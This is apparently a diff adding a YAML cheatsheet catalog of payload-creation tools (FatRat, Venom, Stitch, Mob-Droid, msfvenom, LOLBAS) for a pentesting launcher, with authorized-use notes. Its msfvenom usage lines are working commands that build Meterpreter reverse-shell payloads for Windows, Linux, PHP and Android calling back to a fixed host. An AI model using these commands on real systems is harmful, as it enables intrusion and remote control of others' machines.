@@ -1,0 +1,78 @@
+# Payload Creation — guided-ops cheatsheets for the existing Python "Payload
+# creation tools" collection, plus the standard payload generator (msfvenom) and
+# a reference. The existing tools are interactive menu-driven wrappers, so their
+# overlays give a launch line + a "menu-driven" note rather than invented flags.
+# Overlays enrich existing tools by EXACT title; archived tools are left minimal.
+category:
+  title: "Payload Creation (catalog)"
+  merge_into: "Payload creation tools"
+
+# --- enrich existing Python-defined tools by title --------------------------
+overlay:
+  - title: "The FatRat"
+    tags: [payload, reverse-shell, apk, c2]
+    usage:
+      - ["launch the interactive tool", "sudo fatrat"]
+    lab_safe_notes: >-
+      FatRat is a menu-driven wrapper around msfvenom/msfconsole — it walks you through
+      picking a payload, LHOST/LPORT and output format, then can auto-start a handler.
+      Everything it produces is a real backdoor: generate and deploy only against hosts
+      you're authorized to test, in your own lab. Set LHOST to your attacker IP.
+
+  - title: "Venom Shellcode Generator"
+    tags: [payload, reverse-shell, c2]
+    usage:
+      - ["launch the interactive generator", "./venom.sh"]
+    lab_safe_notes: >-
+      Venom is a menu-driven multi-format shellcode/agent generator (msfvenom under the
+      hood) that also spins up the matching listener. Menu-driven — follow the prompts;
+      there are no shell flags to memorise. Authorized targets / own lab only.
+
+  - title: "Stitch"
+    tags: [payload, c2, reverse-shell, persistence]
+    usage:
+      - ["launch the framework", "python3 main.py"]
+    lab_safe_notes: >-
+      Stitch is a cross-platform Python RAT with an interactive console — you build
+      Windows/macOS/Linux payloads and manage sessions from its prompt. It's a genuine
+      remote-access implant: run it only in an authorized engagement or your own lab,
+      never on systems you don't control.
+
+  - title: "Mob-Droid"
+    tags: [payload, mobile, apk, reverse-shell]
+    usage:
+      - ["launch the Android payload generator", "python3 mob-droid.py"]
+    lab_safe_notes: >-
+      Mob-Droid is a menu-driven front-end that generates Android (APK) Meterpreter
+      payloads via msfvenom. The APKs are real backdoors — install them only on test
+      devices/emulators you own, and set LHOST to your attacker IP when prompted.
+
+# --- the standard payload generator (missing as a first-class entry) ---------
+tools:
+  - title: "msfvenom (Payload Generator)"
+    kind: install
+    tags: [payload, reverse-shell, c2, apk]
+    description: "Metasploit's standalone payload generator + encoder — build reverse/bind shells and Meterpreter stagers in any format (exe, elf, apk, php, raw shellcode)."
+    system_pkgs: {which: msfvenom, apt: metasploit-framework}
+    install: {apt: metasploit-framework}
+    run: ["msfvenom --list payloads"]
+    project_url: "https://github.com/rapid7/metasploit-framework"
+    usage:
+      - ["list available payloads", "msfvenom -l payloads"]
+      - ["Windows exe reverse shell", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe"]
+      - ["Linux elf reverse shell", "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell.elf"]
+      - ["PHP web reverse shell", "msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shell.php"]
+      - ["Android APK payload", "msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -o payload.apk"]
+      - ["raw shellcode as C, encoded", "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x64/xor -f c"]
+    lab_safe_notes: >-
+      Everything msfvenom emits is a working payload — generate and deliver only against
+      authorized targets in your own lab, and set LHOST to your attacker IP. Catch the
+      callback with Metasploit's `exploit/multi/handler` (matching PAYLOAD/LHOST/LPORT).
+      Encoders (-e) change bytes, not behaviour — they are not reliable AV evasion.
+
+# --- reference ---------------------------------------------------------------
+  - title: "LOLBAS (Living Off The Land Binaries)"
+    kind: resource
+    tags: [reference, payload, post-exploitation]
+    description: "Searchable catalog of trusted Windows binaries/scripts that can be abused to execute payloads, download files, or bypass controls."
+    url: "https://lolbas-project.github.io/"
